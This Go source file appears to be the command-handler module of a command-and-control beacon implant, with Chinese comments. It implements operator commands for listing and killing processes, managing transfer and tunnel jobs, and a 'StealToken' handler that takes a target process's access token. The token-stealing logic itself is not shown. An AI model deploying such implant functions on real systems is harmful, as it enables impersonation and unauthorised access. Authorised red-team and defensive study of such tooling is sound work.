package command

import (
	"beacon/pkg/jobs"
	"beacon/pkg/utils/packet"
	"fmt"
)

// ProcessInfo 跨平台进程信息结构
type ProcessInfo struct {
	PID       uint32
	PPID      uint32
	Name      string
	Path      string
	User      string
	Arch      int32 // 0: x86, 1: x64, 2: arm64
	SessionID uint32
}

// Ps 处理进程列表指令
func Ps(p *packet.Parser, acp int) ([]byte, error) {
	processes, err := listProcesses(acp)
	if err != nil {
		return nil, err
	}

	results := make([]any, 0)
	count := int32(len(processes))
	results = append(results, count)

	for _, proc := range processes {
		results = append(results,
			int32(proc.PID),
			int32(proc.PPID),
			packet.PackBytes([]byte(proc.Name)),
			packet.PackBytes([]byte(proc.Path)),
			packet.PackBytes([]byte(proc.User)),
			int32(proc.Arch),
			int32(proc.SessionID),
		)
	}

	return packet.PackArray(results)
}

// Kill 结束指定进程
func Kill(p *packet.Parser) ([]byte, error) {
	argCount := p.ParseInt32()
	if argCount == 0 {
		return nil, fmt.Errorf("kill requires 1 argument (PID)")
	}
	pid := p.ParseInt32()
	msg, err := terminateProcess(int(pid))
	if err != nil {
		return nil, err
	}
	return packet.PackArray([]any{[]byte(msg)})
}

func Jobs(manager *jobs.Manager) ([]byte, error) {
	if manager == nil {
		return packet.PackArray([]any{[]byte("invalid job manager")})
	}
	rows := manager.Rows()
	rows = append(rows, TransferJobRows()...)
	rows = append(rows, TunnelJobRows()...)
	return packet.PackArray([]any{[]byte(jobs.FormatRows(rows))})
}

func KillJob(manager *jobs.Manager, p *packet.Parser) ([]byte, error) {
	if manager == nil {
		return packet.PackArray([]any{[]byte("invalid job manager")})
	}
	if p == nil || p.Size() == 0 {
		return Jobs(manager)
	}

	argCount := p.ParseInt32()
	if p.HasError() {
		return nil, p.Error()
	}
	if argCount < 1 {
		return Jobs(manager)
	}

	jobID := p.ParseInt32()
	if p.HasError() {
		return nil, p.Error()
	}
	if jobID == 0 {
		return Jobs(manager)
	}

	msg, ok := manager.RequestKill(jobID)
	if !ok {
		msg, ok = CancelTransferJob(jobID)
	}
	if !ok {
		msg, ok = CancelTunnelJob(jobID)
	}
	if !ok {
		msg = fmt.Sprintf("job %d not found", jobID)
	}
	return packet.PackArray([]any{[]byte(msg)})
}

// StealToken 窃取指定进程的 Token
func StealToken(p *packet.Parser) ([]byte, error) {
	argCount := p.ParseInt32()
	if argCount == 0 {
		return nil, fmt.Errorf("stealtoken requires 1 argument (PID)")
	}
	pid := p.ParseInt32()
	msg, err := stealTokenLogic(int(pid))
	if err != nil {
		return nil, err
	}
	return packet.PackArray([]any{[]byte(msg)})
}
